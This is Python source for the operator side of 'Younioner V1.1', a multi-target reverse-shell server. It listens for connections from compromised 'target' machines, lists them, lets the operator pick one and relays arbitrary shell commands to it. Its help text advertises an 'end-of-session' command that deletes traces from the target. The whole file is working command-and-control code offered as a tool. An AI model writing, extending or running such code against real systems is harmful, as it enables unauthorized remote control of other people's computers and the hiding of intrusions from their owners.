from socket import *
import time
import threading
import sys
import os
from queue import Queue

queue = Queue()
host = '192.168.1.88' # your computer ip
port = 4343


class Server:
    def __init__(self, _host, _port=3434, _max_client=20):

        # Variables used in this class are here
        self.host = _host
        self.port = _port
        self.max_client = _max_client  # max amount of expected connections

        # once any client connected
        self.all_connection = []  # the connections will be stored here.
        self.all_addresses = []  # the addresses will be stored here.

    # create socket
    def open_socket(self):
        try:
            self.s = socket(AF_INET, SOCK_STREAM)
            self.s.bind((self.host, self.port))

            logo = "__   __                _                  ____   \n" \
                   "\ \ / /__  _   _ _ __ (_) ___  _ __   ___|  _ \  \n" \
                   " \ V / _ \| | | | '_ \| |/ _ \| '_ \ / _ \ |_) | \n" \
                   "  | | (_) | |_| | | | | | (_) | | | |  __/  _ <  \n" \
                   "  |_|\___/ \__,_|_| |_|_|\___/|_| |_|\___|_| \_\ \n"

            print("\n\tWelcome to Younioner V1.1")
            print(logo)
            print('Created by Ayoub Ouakkaha, please visit our website www.ouakkaha.com')
            print('\ncontact us at contact@ouakkaha.com, type help to display available commands.')

            # listen for one connection :)
            self.s.listen(self.max_client)

        except error as e:
            print("** Oops Something went wrong error code ", e)
            time.sleep(5)  # wait for 5s and try again
            self.open_socket()

    # accept incoming connection
    def accept_connection(self):
        for c in self.all_connection:  # close the connection list
            c.close()
        del self.all_connection[:]  # clean connection list
        del self.all_addresses[:]  # clean addresses list

        while True:
            try:
                conn, address = self.s.accept()
                conn.setblocking(1)
                self.all_connection.append(conn)
                self.all_addresses.append(address)
                print("\n* new Connection has been established from {} on {}".format(address[0], address[1]))
                print("\nYounioner> ", end="")
            except error as e:
                print("something went wrong while accepting new connection\n error code: {} \n".format(str(e)))

    # Interactive shell for sending command remotely
    def start_younioner(self):

        while True:
            cmd = str(input("Younioner> "))
            cmd = cmd.lower()
            cmd_stripped = cmd.strip()

            if cmd.strip() == 'list':
                self.list_connections()
                continue
            elif cmd.strip() == "help":
                self.displayHelp()

            elif cmd_stripped.startswith("select"):  # check command start with `select` word
                conn = self.get_target(cmd)
                if conn is not None:
                    self.send_commands(conn)
            elif cmd_stripped == "quit":
                self.exit()

            else:
                print("{} Command not recognized..".format(cmd))

    # Display the help menu
    def displayHelp(self):
        """Display The help menu"""
        help = "\nthis section will help to understand the basic commands: " \
            "\n\nlist............ It will list availabel connection..Usage(just type : `list`)"\
            "\n\nselect.......... used to select a connection to target.. the target number needs be availabel on list section Usage(select 1) or change the number 1 to the target ID"\
            "\n\nquit............ used to close the current connection .. or if you don't have one it will close the script"\
            "\n\nhelp............ as you might guess, it will print the help Menu, which you're looking to now.:)"\
            "\n\nend-of-session.. this is really advance command..this command will delet your trace from the target command, for example it will delet the current running script on the target command which is(Client) "\
            "\n\nIf you liked Our app and you want to help us for providing more and more.. please contact us at contact@ouakkaha.com or visit my site www.ouakkaha.com\nanyway thanks for using my app, be sure to have a greate day :)"


        print(help)
    # Exit Reverse Shell
    def exit(self):
        for c in self.all_connection:
            try:
                c.send(str.encode("end-of-session"))
                c.shutdown(2)
                c.close()
            except Exception as e:
                print('Could not close connection ' + str(e))

        self.s.close()
        print("\n Good By, please have a nice day :) ")

        # this will be over need but believe me, some times the module refuse to exit..
        # this is why i try each of this method cause at the end one of theme should work..
        os._exit(0)
        sys.exit()
        quit(0)
        exit(0)


    # this will display all current connection
    def list_connections(self):
        rs = ''
        for i, conn in enumerate(self.all_connection):  # Enumerate will count number of loop
            try:  # we will test if conn are working..
                conn.send(str.encode(' '))  # send blank to test if conn is working.,
                conn.recv(20240)
            except:  # this will ocure if conn is null
                del self.all_connection[i]
                del self.all_addresses[i]
                continue  # go to next loop do not execut the next line..
            rs += str(i) + '\t' + str(self.all_addresses[i][0]) + '\t' + str(self.all_addresses[i][1]) + '\n'


        print("Currently Available Targets")
        print("ID\tIP\t\t\t\tPORT\n" + rs)

    # Select a target client
    def get_target(self, cmd):
        target = cmd.replace('select ', '')
        try:
            target = int(target)
        except:
            print("Target index should be integer.")
            return None
        try:
            conn = self.all_connection[target]
        except:
            print("Not Invalid Selection..")
            return None

        print("You are now connected to", self.all_addresses[target][0])
        print("Younioner.{} >> ".format(self.all_addresses[target][0]), end="")
        return conn

    # Connect with the target
    def send_commands(self, conn):
        while True:
            try:
                cmd = str(input())

                if len(cmd) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")

                # confirm quit
                if cmd == "quit":
                    print("\nAre you sure, the socket will be closed for this moment..")
                    confirm = str.upper(input("\t N / y >> "))
                    if confirm == "Y":
                        break

            except:
                print("[!] Connection was lost ")
                break

# Setting up threads
def setup_threads():
    server = Server('', port)
    for _ in range(2):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True  # It means when the script got closed the thread also will exit from process
        t.start()
    return


# Do the next job in the queue(1: handles connection, other sends commands and get response back)
def work(server):
    while True:
        x = queue.get()
        if x == 0:  # 0: handles connection
            server.open_socket()
            server.accept_connection()
        if x == 1:  # 1: sends commands to target machine
            server.start_younioner()
        queue.task_done()  # [Done] jobs are done with success
    return


# Each list item is a new job
def create_jobs():
    for x in range(2):
        queue.put(x)
    queue.join()
    return

# the main function
def main():
    setup_threads()
    create_jobs()


if __name__ == '__main__':
    main()
